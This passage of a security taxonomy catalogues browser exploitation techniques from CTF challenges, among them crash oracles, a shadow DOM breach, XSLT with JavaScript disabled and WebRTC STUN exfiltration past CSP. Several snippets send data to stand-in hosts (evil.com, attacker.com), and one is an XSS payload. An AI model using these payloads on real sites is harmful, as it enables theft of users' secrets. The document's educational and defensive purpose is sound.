## 5. Browser-Native Side Channels & Mechanism Abuse

> Novel browser-side exploitation primitives that abuse legitimate web platform features in unintended ways. These are distinct from standard XS-Leaks (covered in `xs-leak.md`) because they exploit *specific browser implementation details or newer APIs* rather than general cross-origin information leakage patterns.

### 5.1 Browser Crash / Hang as 1-Bit Oracle

**What is manipulated**: A browser rendering bug causes a tab crash or extreme slowdown *conditional* on page content. The crash/hang itself becomes a detectable signal.

**DiceCTF 2024 "another-csp"**: CSS `color-mix()` with `srgb(from var(...))` triggered a Chromium rendering bug that crashed the tab. By making the CSS selector conditional on a data attribute:

```css
/* If the token starts with "a", apply the crashing CSS: */
h1[data-token^="a"] {
    color: color-mix(in srgb, blue 50%, srgb(from var(--c1) r g b));
}
```

- Crash (detected via 10s timeout) = character match
- No crash = no match
- Binary search extracts the full token character by character

**Variant — CSS variable recursion**: Instead of a crash, use billion-laughs-style CSS variable expansion to cause measurable slowdown:
```css
/* Exponential expansion causes detectable delay: */
:root { --a: var(--b)var(--b); --b: var(--c)var(--c); /* ... */ }
h1[data-token^="a"] { content: var(--a); }
```

### 5.2 Closed Shadow DOM Breach via Deprecated APIs

**What is manipulated**: Closed Shadow DOM is supposed to be an impenetrable encapsulation boundary. Deprecated WebKit CSS properties combined with deprecated DOM APIs pierce through it.

**DiceCTF 2022 "shadow"**: The flag is inside a closed Shadow DOM with all `document`/`window` references nulled.

```css
/* Step 1: Apply deprecated CSS to make shadow host editable */
#shadow-host {
    -webkit-user-modify: read-write;
}
```

```javascript
// Step 2: Use window.find() to focus text within the shadow boundary
window.find('flag');

// Step 3: Use deprecated execCommand to inject into the shadow context
document.execCommand('insertHTML', false, '<svg onload="fetch(`https://evil.com/?`+this.getRootNode().textContent)">');
// The SVG executes inside the shadow DOM context → can read enclosed content
```

**Key insight**: `-webkit-user-modify` enables `contenteditable`-like behavior on the shadow host. `window.find()` + `document.execCommand` then operate *inside* the shadow boundary because the editable region spans it.

### 5.3 XSLT/XXE in Browser with JavaScript Disabled

**What is manipulated**: Puppeteer's `page.setJavaScriptEnabled(false)` only disables JavaScript — the browser's XML/XSLT processing engine remains fully active and is not restricted by CSP.

**DiceCTF 2023 "impossible-xss"**:
```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="data:text/xml,
  <xsl:stylesheet xmlns:xsl='http://www.w3.org/1999/XSL/Transform' version='1.0'>
    <xsl:template match='/'>
      <html>
        <body>
          <img src='https://evil.com/?exfil=xslt-triggered-request'/>
        </body>
      </html>
    </xsl:template>
  </xsl:stylesheet>
"?>
<root/>
```

**Why it works**: XSLT is processed by a separate engine in the browser, not the JavaScript engine. CSP `script-src` doesn't block XSLT processing. `setJavaScriptEnabled(false)` doesn't affect XML parsing. The XSLT output (HTML) can include `<img>` tags for data exfiltration.

### 5.4 Chrome Text Fragment Pixel Side-Channel

**What is manipulated**: Chrome's Scroll-to-Text Fragment (`#:~:text=`) highlights matching text with a yellow background. This visual change is detectable even after extreme image downsampling.

**HITCON CTF 2021 "Vulpixelize"**: A screenshot service captures URLs at 1920x1080, downscales to 64x64, then upscales back (extreme pixelation).

```
Attack:
  1. The /flag endpoint returns the flag only to 127.0.0.1
  2. The screenshot service accesses URLs from localhost
  3. Request: http://127.0.0.1:8000/flag#:~:text=hitcon{a
     → If "hitcon{a" exists in the page, Chrome highlights it (yellow background)
     → Even at 64x64, the color difference is measurable
  4. Binary search over characters: highlighted = match, no highlight = no match
```

### 5.5 Cookie Parser Differential (Jetty / Tomcat Quote Smuggling)

> **→ Comprehensive coverage**: `02-auth/cookie.md` §1-2 (Cookie Sandwich), §2-1 (Legacy RFC Parsing), §2-2 (Quoted-Value Parsing Differentials). This section retains only the CTF-specific exploitation chain.

**DiceCTF 2023 "jnotes"**: Combined cookie path ordering + Jetty RFC 2109 quoted-string absorption to leak HttpOnly flags. The novel element was using Chrome's path-length-first cookie ordering to position an attacker-set cookie (`=note="`) before the HttpOnly cookie, causing Jetty's parser to absorb the flag into the quoted value.

### 5.6 WebRTC STUN DNS Exfiltration (CSP Bypass)

**What is manipulated**: CSP does not restrict WebRTC ICE candidate gathering. Creating an `RTCPeerConnection` with a STUN server URL containing encoded data triggers a DNS lookup that exfiltrates data.

**corCTF 2023 "crabspace"**: Strict CSP (`default-src 'none'; script-src 'unsafe-inline'`) blocks all network requests. But WebRTC is exempt:

```javascript
// CSP blocks: fetch(), XHR, img src, script src, etc.
// CSP does NOT block: WebRTC STUN/TURN ICE candidate gathering

const pc = new RTCPeerConnection({
    iceServers: [{ urls: 'stun:' + encodedData + '.attacker.com:1337' }]
});
pc.createDataChannel('');
pc.createOffer().then(o => pc.setLocalDescription(o));
// → DNS query for "{encodedData}.attacker.com" → attacker's DNS server captures it
```

**Key insight**: This bypasses even the strictest CSP configurations. The W3C is aware (CSP Issue #92) but WebRTC ICE candidate gathering remains unrestricted.

### 5.7 bfcache Weaponization (Response Replay)

**What is manipulated**: The browser's back-forward cache (bfcache) stores complete page snapshots. Navigating back replays the cached response — including any poisoned headers or content from the initial load.

**corCTF 2024 "iframe-note"**: Prototype pollution injects a `SCRIPT_NAME` header into fetch requests. Gunicorn uses this to determine the base URL, causing `<script src>` attributes to resolve to the attacker's domain. But this only works for the *initial* page load. The exploit forces a forward navigation, then triggers back-navigation — bfcache replays the poisoned response, loading attacker's scripts.

### 5.8 CSP `report-uri` as Exfiltration Channel

**What is manipulated**: When a CSP violation occurs, the browser sends a JSON report to `report-uri`. The `script-sample` field in violation reports contains approximately the first 40 characters of the blocked content, and only when the `'report-sample'` directive is present in the CSP. By intentionally triggering violations, the attacker can use this as a limited data exfiltration channel — not full content, but enough for short secrets like flags.

**DiceCTF 2023 "codebox"**: Inject `require-trusted-types-for 'script'` into CSP. Any `innerHTML` assignment now triggers a Trusted Types violation. The violation report's sample field leaks a prefix of the blocked content — sufficient for flag extraction in CTF contexts where the flag fits within the sample limit.

### 5.9 Unicode Case-Folding Length Confusion in WASM

**What is manipulated**: Unicode case conversion can change string length (German `ß` → `SS`, ligature `ﬃ` → `FFI`). When WASM calculates buffer size *before* conversion, the expanded result overflows the safety check boundary.

**DiceCTF 2022 "blazingfast"**: WASM-based "MoCkInG CaSe" converter checks first N characters for safety.

```
Input: "ß" × 500 + "<img src=x onerror=alert(1)>"

WASM length check: examines first 500 bytes → all safe 'ß' characters ✓
After uppercase conversion: "SS" × 500 + "<img src=x onerror=alert(1)>"
  → The converted string is 1000+ bytes, but the XSS payload at position 500+
    was never examined because the length check only covered the pre-conversion size
```

### 5.10 Nginx Error Response CSP Header Omission

**What is manipulated**: Nginx middleware that adds CSP headers via `add_header` only applies to 2xx and 3xx responses by default. Error responses (4xx, 5xx) lack CSP headers.

**corCTF 2023 "leakynote"**: Search returning no results triggers 404. The 404 response has no `frame-ancestors` CSP → the page can be iframed. By testing if the iframe loads (no CSP) or is blocked (CSP present), the attacker determines whether a search query has results — a binary oracle for character-by-character flag extraction.

```nginx
# Nginx config — VULNERABLE pattern (missing "always"):
add_header Content-Security-Policy "frame-ancestors 'none'";
# Without "always", the header is only added to 2xx/3xx responses
# 4xx/5xx responses lack CSP → can be iframed

# FIXED pattern:
# add_header Content-Security-Policy "frame-ancestors 'none'" always;
```

---

## 6. Competition → Technique Cross-Reference

| Competition | Year | Challenge | Technique | Section |
|------------|------|-----------|-----------|---------|
| **Google CTF** | 2025 | Postviewer v5 | PRNG state recovery from base36-encoded partial output via Z3 | §2.5 |
| **Google CTF** | 2024 | Grand Prix Heaven | Regex `[A-z]` range includes `[\]^_\`` — path validation bypass | §3.3 |
| **HITCON CTF** | 2024 | HTML Upload | Chunked encoding differential: validator processes entire file, browser processes chunk-by-chunk with different encoding per chunk | §3.4 |
| **HITCON CTF** | 2025 | Pholyglot | SQLite `VACUUM INTO` file write from 30-char SQL injection window | §4.2 |
| **HITCON CTF** | 2025 | No Man's Echo | TCP port reflection for eval injection — echo service as code delivery | §4.3 |
| **HITCON CTF** | 2021 | Vulpixelize | Chrome Text Fragment pixel side-channel through extreme downsampling | §5.4 |
| **HITCON CTF** | 2020 | oStyle | Apache `mod_negotiation` MultiViews Content-Type bypass | §4.4 |
| **HITCON CTF** | 2019 | Buggy .Net | ASP.NET Request Validation exception swallows security checks | §4.5 |
| **HITCON CTF** | 2017 | Babyfirst Revenge | Filesystem-as-command-assembler — 5-byte/4-byte RCE | §4.1 |
| **PlaidCTF** | 2025 | Tales from the Crypt | Corrupted RSA key recovery via Coppersmith's method → TLS session decryption from pcap | §2.3.2 |
| **DiceCTF** | 2024 | another-csp | Browser crash (`color-mix` bug) as 1-bit oracle for token extraction | §5.1 |
| **DiceCTF** | 2023 | jwtjail | Proxy `apply` trap `argumentsList` realm leak → vm sandbox escape | §1.2.4 |
| **DiceCTF** | 2023 | impossible-xss | XSLT/XXE in browser with JS disabled — bypasses CSP and `setJavaScriptEnabled(false)` | §5.3 |
| **DiceCTF** | 2023 | jnotes | Jetty cookie parser quote smuggling — absorbs HttpOnly cookie into reflected value | §5.5 |
| **DiceCTF** | 2023 | codebox | CSP `report-uri` as exfiltration channel via Trusted Types violation | §5.8 |
| **DiceCTF** | 2023 | unfinished | cURL config file chaining for raw TCP (SSRF to MongoDB without gopher) | §4.6 |
| **DiceCTF** | 2022 | shadow | Closed Shadow DOM breach via `-webkit-user-modify` + `window.find()` | §5.2 |
| **DiceCTF** | 2022 | blazingfast | Unicode case-folding length confusion in WASM (`ß` → `SS` expansion) | §5.9 |
| **corCTF** | 2024 | iframe-note | bfcache weaponization — back-navigation replays poisoned response | §5.7 |
| **corCTF** | 2023 | crabspace | WebRTC STUN DNS exfiltration bypasses strictest CSP | §5.6 |
| **corCTF** | 2023 | leakynote | Nginx error response omits CSP headers → `frame-ancestors` bypass oracle | §5.10 |
| **SECCON CTF** | 2024 | Pyjail | `help()` as import primitive — help system internally imports modules | §1.1.2 |
| **jailCTF** | 2025 | multiple | `gc.get_objects()` memory archaeology, code object surgery, `__init_subclass__` hooks | §1.1 |
| **KalmarCTF** | 2025 | Pyjail | `numpy.genfromtxt()` for arbitrary file read in restricted environment | §1.1.1 |

---

## 7. Cross-Reference to Dedicated Documents

The following topics are frequently seen in CTFs but are comprehensively covered in their own taxonomy documents within the-map. **Do not add them to this document.**

| CTF Topic | Dedicated Document | Key Sections |
|-----------|-------------------|-------------|
| XS-Leaks (frame counting, timing, cache probing) | `05-client-side/xs-leak.md` | §1 Timing, §2 State-Based, §3 Event-Based |
| Prototype Pollution → RCE gadgets (EJS, Pug, child_process) | `01-injection/prototype-pollution.md` | §5 Server-Side Gadgets |
| PHP internals (iconv, session upload, extract, PHP-FPM) | `09-frameworks-and-languages/php.md` | §3–§8 |
| DOM Clobbering (router hijack, sanitizer bypass) | `05-client-side/dom-clobbering.md` | §1–§5 |
| CSS injection / exfiltration (`:has()`, `@import` chain) | `05-client-side/client-side-web-security.md` | §1 XS-Leaks via CSS |
| Client-Side Desync (browser-powered smuggling) | `03-http-protocol/http-parsing-discrepancy/http-request-smuggling.md` | CSD section |
| ESI / XSLT injection | `01-injection/ssi-esi-xslt-injection.md` | §2 ESI, §3 XSLT |
| HTML-to-PDF SSRF (wkhtmltopdf, Puppeteer, mPDF) | `04-server-side/document-media-processing-library-rce.md` | §9 HTML-to-PDF |
| LaTeX injection | `01-injection/latex-injection.md` | §1–§4 |
| Redis SSRF (Gopher, RESP injection) | `04-server-side/ssrf.md` | Protocol scheme abuse |
| Argument / flag injection (git, tar, curl, ssh) | `01-injection/command-injection.md` | §2 Argument Injection |
| Race conditions (single-packet, last-byte, multi-endpoint) | `07-application-logic/web-race-condition.md` | §1–§8 |
| SSTI payloads (Jinja2, Twig, FreeMarker, Velocity, Smarty) | `01-injection/ssti.md` | §1–§6 |
| HTTP/2 CONTINUATION flood / Rapid Reset | `03-http-protocol/http-parsing-discrepancy/http-request-smuggling.md` | HTTP/2 section |
| WebSocket hijacking (CSWSH) | `03-http-protocol/websocket.md` | Cross-site section |
| JSON number precision loss (IEEE 754 `2^53`) | `06-encoding-parser/type-confusion-and-coercion.md` | §9-4 |
| Cookie parser differentials (Jetty, Tomcat, RFC 2109 quoted-string) | `02-auth/cookie.md` | §1-2 Cookie Sandwich, §2-1 Legacy RFC, §2-2 Quoted-Value |
| TLS attacks (CRIME, BREACH, ROBOT) | `07-application-logic/web-timing-attack.md` | TLS timing section |

---

## References

### CTF Challenge Archives & Writeups
- [Orange Tsai — [My-CTF-Web-Challenges](](https://github.com/orangetw/My-CTF-Web-Challenges)) — 38+ HITCON CTF web challenges with source code and intended solutions
- [jailCTF — [Pyjail Collection](](https://github.com/jailctf/pyjail-collection)) — Comprehensive pyjail challenge archive
- [Huli — [DiceCTF 2022 Writeups](](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/)) — Shadow DOM breach, blazingfast WASM bypass
- [Huli — [DiceCTF 2023 Writeups](](https://blog.huli.tw/2023/02/08/en/dicectf-2023-writeup/)) — jwtjail Proxy escape, impossible-xss XSLT, jnotes cookie smuggling
- [Huli — [DiceCTF 2024 Writeups](](https://blog.huli.tw/2024/02/07/en/dicectf-2024-writeup/)) — another-csp browser crash oracle
- [Huli — [corCTF 2023 Writeups](](https://blog.huli.tw/2023/08/07/en/corctf-2023-writeup/)) — crabspace WebRTC exfil, leakynote Nginx CSP omission
- [Huli — [GoogleCTF 2024 Writeups](](https://blog.huli.tw/2024/06/28/en/google-ctf-2024-writeup/)) — Grand Prix Heaven regex bypass
- [Huli — [HITCON CTF & corCTF & SekaiCTF 2024](](https://blog.huli.tw/2024/09/23/en/hitconctf-corctf-sekaictf-2024-writeup/)) — Encoding differentials

### Specific Technique References
- [terjanq — [Postviewer v5 (Google CTF 2025)](](https://gist.github.com/terjanq/e66c2843b5b73aa48405b72f4751d5f8)) — PRNG state recovery writeup
- [jsur.in — [PlaidCTF 2025 Tales from the Crypt](](https://jsur.in/posts/2025-04-07-plaid-ctf-2025-tales-from-the-crypt/)) — RSA partial key exposure
- [Chovid99 — [Google CTF 2025](](https://chovid99.github.io/posts/google-ctf-2025/)) — Multiple challenge writeups
- [Ankur Sundara — [corCTF 2024 iframe-note](](https://ankursundara.com/blog/)) — bfcache weaponization with prototype pollution
- [str.lc — [DiceCTF 2023 codebox](](https://str.lc/)) — CSP report-uri exfiltration via Trusted Types
- [Bishop Fox — [Untwisting the Mersenne Twister](](https://bishopfox.com/blog/untwisting-mersenne-twister-killed-prng)) — PRNG state recovery
- [XPN — [VM2 Sandbox Escape](](https://www.xpnsec.com/)) — Node.js vm2 escape techniques
- [LiveOverflow — [Python Jail Escape Techniques](](https://www.youtube.com/c/LiveOverflow)) — Video walkthroughs

---

*This document covers exploitation primitives that fall outside the standard vulnerability classes in the-map project. Each technique has been validated in top-tier CTF competitions. For topics with dedicated taxonomy documents, see the cross-reference table above.*
